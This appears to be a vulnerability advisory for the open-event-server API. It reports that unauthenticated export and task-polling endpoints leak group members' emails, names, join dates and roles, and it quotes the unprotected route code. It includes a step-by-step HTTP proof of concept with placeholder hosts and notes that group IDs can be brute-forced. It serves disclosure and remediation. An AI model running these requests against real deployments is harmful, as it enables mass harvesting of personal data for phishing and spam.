https://github.com/fossasia/open-event-server - "This repository was archived by the owner on May 22, 2026. It is now read-only."

## Finding: Unauthenticated Group Follower Data Export Exposes Member Emails and PII
Package: open-event-server

Affected Versions: all versions (confirmed on latest commit, version 1.19.1)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CVSS Score: 7.5

CWE: CWE-306 -- Missing Authentication for Critical Function

### Summary

The Open Event Server API exposes two endpoints without any authentication check that together allow an unauthenticated remote attacker to export the complete member roster of any group, including member email addresses, public names, join dates, and roles. No account, token, or permission of any kind is required.

### Details

Two endpoints lack authentication decorators:

**1. `POST /v1/group/<group_id>/export/followers/csv`**

Defined in `app/api/exports.py` lines 253-263:

```python
@export_routes.route(
    '/group/<int:group_id>/export/followers/csv',
    methods=['POST'],
    endpoint='export_group_followers_csv',
)
def export_group_followers_csv(group_id):
    from .helpers.tasks import export_group_followers_csv_task
    task = export_group_followers_csv_task.delay(group_id)
    return jsonify(task_url=url_for('tasks.celery_task', task_id=task.id))
```

No `@jwt_required`, `@is_admin`, or any other authentication decorator is present. Every other export endpoint in the same file has `@is_coorganizer` or `@is_admin` applied.

**2. `GET /v1/tasks/<task_id>`**

Defined in `app/api/celery_tasks.py`:

```python
@celery_routes.route('/tasks/<string:task_id>')
def celery_task(task_id):
    ...
    return jsonify(state=state, result=info)
```

Also entirely unauthenticated. The task result includes the `download_url` of the generated CSV file.

**Exported data** (from `app/api/helpers/csv_jobs_util.py`):

The CSV contains for every group member:
- Public Profile Name
- Email address
- Group Join Date
- Role (Owner, Organizer, Follower)

An attacker who knows a group ID (integer, enumerable by brute-force starting from 1) can export the full member list of that group with no account required.

### PoC

The following demonstrates full unauthenticated data exfiltration. All requests are made with no `Authorization` header.

**Step 1 - Trigger export:**
```
POST /v1/group/1/export/followers/csv HTTP/1.1
Host: target.example.com
Content-Type: application/json

{}
```

Response:
```json
{"task_url": "/v1/tasks/7a3eae53-ceb7-48e8-b6a7-f0a01e573f57"}
```

**Step 2 - Retrieve result (poll until state == SUCCESS):**
```
GET /v1/tasks/7a3eae53-ceb7-48e8-b6a7-f0a01e573f57 HTTP/1.1
Host: target.example.com
```

Response:
```json
{
  "result": {
    "download_url": "https://target.example.com/static/media/exports/group/csv//aHd3MGxKRF/group-followers-ab3e47e2.csv"
  },
  "state": "SUCCESS"
}
```

**Step 3 - Download CSV:**
```
GET /static/media/exports/group/csv//aHd3MGxKRF/group-followers-ab3e47e2.csv
```

Response:
```
Public Profile Name,Email,Group Join Date,"Role (Owner, Organizer, Follower)"
,victim@example.com,"May 23, 2026 14:42 +0000",Follower
```

A working PoC script is available at `scripts/poc_unauth_group_export.py`.

**Live reproduction:** Confirmed on Docker deployment (eventyay/open-event-server:development) running version 1.19.1 at localhost:9120.

### Impact

Any unauthenticated internet user can:

1. Enumerate group IDs (small integers starting from 1) by brute-forcing the endpoint.
2. For each group, trigger a CSV export and retrieve the download URL with two unauthenticated HTTP requests.
3. Download a CSV containing the email addresses, names, join dates, and roles of every member of that group.

This constitutes a complete, unauthenticated breach of group membership data. On platforms hosting events with paid tickets, attendee and organizer emails are directly exposed. The data can be used for targeted phishing, spam campaigns, or deanonymization of group members who may believe their membership is private.

The secondary issue (unauthenticated `/v1/tasks/<task_id>`) is independently exploitable: any user with knowledge of a valid Celery task UUID can poll task results, including results from export tasks triggered by authenticated users.

